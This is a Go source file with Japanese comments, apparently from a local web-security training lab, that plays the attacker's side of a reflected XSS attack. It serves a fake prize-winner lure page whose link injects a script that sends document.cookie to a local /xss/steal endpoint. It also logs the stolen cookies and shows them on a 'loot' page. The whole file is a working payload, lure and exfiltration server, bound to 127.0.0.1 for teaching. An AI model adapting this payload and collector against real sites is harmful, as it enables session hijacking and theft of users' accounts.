package main

import (
	"fmt"
	"html"
	"log"
	"net/http"
	"strings"
	"sync"
	"time"
)

// このファイルは「反射型XSSの攻撃者サイト」を模したもの。
// 標的アプリ(8080)の脆弱な /xss/reflected に対し、被害者に悪意あるリンクを踏ませ、
// その人のブラウザで攻撃者のスクリプトを実行させる。実行されたスクリプトは
// 被害者の Cookie を攻撃者サーバー(この 9090)の /xss/steal へ送信する。
// 本体・CSRF罠と同様、127.0.0.1 にのみバインドする。

// trapXSSHTML は被害者に踏ませる罠ページ。
// 反射型XSSは「細工したURLを他人に開かせる」ことで成立するため、
// 攻撃者はこのような見せかけのページでリンクを踏ませる。
//
// リンク先の ?q= には、次のスクリプトを(URLエンコードして)仕込んでいる:
//
//	<script>new Image().src='http://127.0.0.1:9090/xss/steal?c='+encodeURIComponent(document.cookie)</script>
//
// これが標的アプリのオリジンで実行され、被害者の demo_session Cookie を攻撃者へ送る。
const trapXSSHTML = `<!DOCTYPE html>
<html lang="ja"><head><meta charset="utf-8"><title>プレゼント当選 - vuln-lab</title></head>
<body>
<div style="background:#b00020;color:#fff;padding:8px 16px;font-weight:bold">⚠️ 攻撃者サイトを模した罠ページです(ローカル学習専用)</div>
<h1>おめでとうございます!あなたは当選しました</h1>
<p>(本来は魅力的な見せかけの内容で、被害者に下のリンクを踏ませます)</p>
<p>
  <a href="http://127.0.0.1:8080/xss/reflected?q=%3Cscript%3Enew%20Image().src%3D%27http%3A%2F%2F127.0.0.1%3A9090%2Fxss%2Fsteal%3Fc%3D%27%2BencodeURIComponent(document.cookie)%3C%2Fscript%3E">
    景品を受け取る
  </a>
  (開くと標的サイト上で攻撃者のスクリプトが実行され、あなたのCookieが攻撃者サーバーへ送られます)
</p>
<p>標的サイトは、このリンクを開いた時のレスポンスで demo_session Cookie を発行します。Set-Cookie はスクリプトの実行前にブラウザへ反映されるため、事前に標的サイトを開いていなくても、リンクを踏むだけで Cookie を盗めます。</p>
<p>攻撃者サーバーが受け取ったCookieは、この罠サーバーを起動したターミナルのログに出力されるほか、攻撃者の画面 <a href="/xss/loot" target="_blank">/xss/loot(戦利品)</a> でも確認できます。</p>
<p><a style="display:inline-block;padding:6px 12px;margin:4px 8px 4px 0;background:#444;color:#fff;text-decoration:none;border-radius:4px" href="http://127.0.0.1:8080/xss/reflected" target="_blank" rel="noopener">被害者の標的画面を開く</a><a style="display:inline-block;padding:6px 12px;margin:4px 8px 4px 0;background:#444;color:#fff;text-decoration:none;border-radius:4px" href="/xss/loot" target="_blank" rel="noopener">戦利品を見る</a></p>
</body></html>`

// stolenCookie は攻撃者サーバーが受け取った1件分の窃取結果。
type stolenCookie struct {
	At     time.Time
	Cookie string
	From   string
}

// maxLoot は保持する件数の上限。学習用なのでメモリ上にだけ持ち、再起動で消える。
const maxLoot = 100

var (
	lootMu sync.Mutex
	loot   []stolenCookie
)

func addLoot(s stolenCookie) {
	lootMu.Lock()
	defer lootMu.Unlock()
	loot = append(loot, s)
	if len(loot) > maxLoot {
		loot = loot[len(loot)-maxLoot:]
	}
}

// xssLootHandler は攻撃者が見る「戦利品」ページ。受け取った Cookie を新しい順に表示する。
// 被害者に見せるページではなく、攻撃者サイト側の管理画面に相当する。
func xssLootHandler() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		lootMu.Lock()
		items := make([]stolenCookie, len(loot))
		copy(items, loot)
		lootMu.Unlock()

		var b strings.Builder
		b.WriteString(`<!DOCTYPE html>
<html lang="ja"><head><meta charset="utf-8"><meta http-equiv="refresh" content="3"><title>戦利品 - vuln-lab</title></head>
<body>
<div style="background:#b00020;color:#fff;padding:8px 16px;font-weight:bold">⚠️ 攻撃者サイトを模した罠ページです(ローカル学習専用)</div>
<h1>攻撃者の戦利品(窃取したCookie)</h1>
<p>反射型XSSで被害者のブラウザから送られてきた Cookie を、新しい順に表示します。3秒ごとに自動更新します。</p>
`)
		if len(items) == 0 {
			b.WriteString("<p>まだ受信していません。<a href=\"/xss/\">罠ページ</a>のリンクを踏むと、ここに表示されます。</p>\n")
		} else {
			b.WriteString("<table border=\"1\" cellpadding=\"6\" style=\"border-collapse:collapse\">\n<tr><th>受信時刻</th><th>盗まれたCookie</th><th>送信元</th></tr>\n")
			for i := len(items) - 1; i >= 0; i-- {
				s := items[i]
				// 窃取データは被害者側から来る任意の文字列なので、攻撃者サイト自身がXSSされないようエスケープする。
				fmt.Fprintf(&b, "<tr><td>%s</td><td><code>%s</code></td><td>%s</td></tr>\n",
					s.At.Format("15:04:05"), html.EscapeString(s.Cookie), html.EscapeString(s.From))
			}
			b.WriteString("</table>\n")
		}
		b.WriteString("<p><a href=\"/\">← 罠サーバーのトップへ</a></p>\n</body></html>")

		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write([]byte(b.String()))
	}
}

// xssStealHandler は反射型XSSで盗み出された Cookie を受け取る「攻撃者の収集サーバー」。
// 実際の攻撃では、窃取したCookieで被害者になりすます(セッションハイジャック)。
func xssStealHandler() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		stolen := r.URL.Query().Get("c")
		log.Printf("[XSS STEAL] 被害者のCookieを受信しました: %q (from %s)", stolen, r.RemoteAddr)
		addLoot(stolenCookie{At: time.Now(), Cookie: stolen, From: r.RemoteAddr})

		// 画像として読み込ませているため、1x1 の透明GIFを返しておく。
		// 同じURLを続けて踏んでもキャッシュされず、毎回サーバーに届くようにする。
		w.Header().Set("Cache-Control", "no-store")
		w.Header().Set("Content-Type", "image/gif")
		w.Write([]byte{
			0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00,
			0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0x21, 0xf9, 0x04, 0x01, 0x00,
			0x00, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00,
			0x00, 0x02, 0x02, 0x44, 0x01, 0x00, 0x3b,
		})
	}
}

// registerXSSTrapRoutes は反射型XSSの罠ページと窃取サーバーを登録する。
func registerXSSTrapRoutes(mux *http.ServeMux) {
	mux.Handle("GET /xss/{$}", trapPage(withNote(trapXSSHTML,
		"下のリンクは、標的アプリの /xss/reflected?q=… に、Cookie を送るスクリプトを仕込んだものです。標的アプリが検索語をエスケープせず表示するため、被害者のブラウザで標的アプリのオリジンとしてスクリプトが動き、Cookie を 9090 の /xss/steal へ送ります。受信結果は「戦利品を見る」で確認できます。")))
	mux.Handle("GET /xss/steal", xssStealHandler())
	mux.Handle("GET /xss/loot", xssLootHandler())
}
